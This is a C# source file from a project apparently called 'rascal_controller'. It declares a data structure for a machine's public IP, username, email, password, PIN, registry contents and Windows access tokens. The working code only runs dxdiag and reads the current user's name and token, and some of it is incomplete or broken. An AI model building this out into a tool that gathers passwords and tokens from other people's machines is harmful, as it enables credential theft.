using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Serialization;
using System.Threading;
using System.Diagnostics;
using System.Security.Principal;
using System.Windows;
using System.Data.Entity;
using System.IO;
using System.Text.RegularExpressions;

namespace rascal_controller.util
{
    public static class informationGatherer
    {
        [XmlRoot("inf")]
        static public class _information
        {
            [XmlElement("publicIp")]
            static public string publicIp;
            [XmlElement("username")]
            static public string username;
            [XmlElement("email")]
            static public string email;
            [XmlElement("password")]
            static public string password;
            [XmlElement("pin")]
            static public string pin;
            [XmlElement("desktopName")]
            static public string desktopName;
            [XmlElement("dxDiag")]
            static public string dxDiag;
            [XmlElement("registry")]
            static public byte[] registry;
            [XmlElement("name")]
            static public string name;
            [XmlElement("token")]
            static public IntPtr token;
            [XmlElement("accessToken")]
            static public IntPtr accessToken;
        }

        /*static void parseReg(string path)
        {
            StreamReader reader = new StreamReader(path);
            string regFileContent = reader.ReadToEnd();
            string[] lines = regFileContent.Split('\n');
            foreach (string line in lines)
            {
                Match match = Regex.Match(line, @"^"(.+?)""\s + ""(.+?)""$");
                if (match.Success)
                {
                    string key = match.Groups[1].Value;
                    string value = match.Groups[2].Value;
                    Console.WriteLine("Key: {0}, Value: {1}", key, value);
                }
            }
        }
        *///fix weird string
        
        private static string RunDxDiag()
        {
            var psi = new ProcessStartInfo();
            if (IntPtr.Size == 4 && Environment.Is64BitOperatingSystem)
            {
                // Need to run the 64-bit version
                psi.FileName = System.IO.Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "sysnative\\dxdiag.exe");
            }
            else
            {
                // Okay with the native version
                psi.FileName = System.IO.Path.Combine(
                    Environment.SystemDirectory,
                    "dxdiag.exe");
            }
            string path = System.IO.Path.GetTempFileName();
            try
            {
                psi.Arguments = "/x " + path;
                using (var prc = Process.Start(psi))
                {
                    prc.WaitForExit();
                    if (prc.ExitCode != 0)
                    {
                        throw new Exception("DXDIAG failed with exit code " + prc.ExitCode.ToString());
                    }
                }
                return System.IO.File.ReadAllText(path);
            }
            finally
            {
                System.IO.File.Delete(path);
            }
        }

        public static void gatherInformation()
        {
            _information.name = WindowsIdentity.GetCurrent().Name;
            _information.token = WindowsIdentity.GetCurrent().Token;


        }
    }
}
